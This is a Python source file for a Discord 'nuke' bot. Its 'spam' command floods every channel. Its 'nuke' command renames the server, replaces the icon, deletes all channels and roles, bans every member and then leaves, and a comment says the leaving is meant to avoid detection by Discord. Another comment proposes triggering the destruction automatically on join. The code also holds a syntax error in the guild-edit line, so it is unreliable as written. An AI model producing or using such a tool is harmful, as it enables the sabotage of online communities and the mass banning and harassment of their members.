import discord,asyncio,time,random
from discord.ext import commands
from discord.ext.commands import bot
intents = discord.Intents(messages=True, guilds=True, members=True)
client = commands.Bot(command_prefix='!', intents=intents)
client.remove_command("help")

token = "" # insert bot your token here

@client.event
async def on_ready():
    print ("Bot online")

@client.event
async def on_server_join(server):
    print("Joining {0}".format(server.name))
    # if you want you could paste the code from the command here so it nukes on join

@client.command(pass_context=True)
async def spam(ctx, count: int):
  while count > 0:
    for channel in list(ctx.message.guild.channels):
        count -= 1
        try:
            await channel.send("Hello World!")
        except:
            pass

@client.command(pass_context=True)
async def nuke(ctx):
    await ctx.message.delete()
    imagelist = ["1", "2", "3", "4", "5", "6", "7", "8", "9"]
    with open((random.choice(imagelist) + '.jpg'), 'rb') as f:
        icro = f.read()
    await ctx.guild.edit(name=("Nuked Server")), icon=icro) # change the guild icon
    dlc = 0
    for channel in list(ctx.message.guild.channels):
        try:
            await channel.delete()
            dlc += 1
        except:
            pass
        guild = ctx.message.guild
        channel = await guild.create_text_channel("channel")
        # await channel.send("nuked")
        # Uncomment the above if you want it to send a message everytime it creates a channel
    print("Deleted " + str(dlc) + " channels")
    for r in ctx.guild.roles:
        try:
        	await r.delete()
        except:
            pass
    print("Deleted roles")
    bndu = 0
    guild = ctx.message.guild
    for member in list(client.get_all_members()):
        try:
            await guild.ban(member)
            bndu += 1
        except:
            pass
    print("Banned " + str(bndu) + " members")
    try:
        await ctx.guild.leave() # leave the guild so that the bot wont get kicked/banned, resulting in the bot getting flagged by discord
    except:
        pass
    print("Mission complete: Left the server")

client.run(token)
